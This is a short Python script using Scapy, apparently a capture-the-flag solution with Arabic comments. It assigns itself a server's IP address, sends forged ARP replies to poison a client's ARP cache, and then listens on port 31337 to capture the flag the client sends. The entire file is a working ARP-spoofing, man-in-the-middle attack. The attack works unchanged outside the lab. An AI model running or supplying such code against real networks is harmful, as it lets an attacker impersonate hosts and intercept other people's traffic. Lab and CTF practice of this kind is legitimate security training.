from scapy.all import *
import socket
import time

iface      = "eth0"
my_mac     = get_if_hwaddr(iface)
client     = "10.0.0.2"
server     = "10.0.0.3"
client_mac = getmacbyip(client)

# Step 1: سجّل IP الـ Server
os.system("ip addr add 10.0.0.3/24 dev eth0")
print("[+] Added 10.0.0.3 to eth0")

# Step 2: ARP Poison لثواني كفاية
print("[+] Poisoning ARP cache...")
for _ in range(5):
    sendp(Ether(dst=client_mac) /
          ARP(op=2, pdst=client, hwdst=client_mac,
              psrc=server, hwsrc=my_mac),
          iface=iface, verbose=False)
    time.sleep(0.5)

# Step 3: استقبل الـ Flag
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("10.0.0.3", 31337))
s.listen()
print("[+] Waiting for flag...")

conn, addr = s.accept()
data = conn.recv(1024)
print(f"\n[FLAG] {data.decode(errors='ignore')}\n")
conn.close()
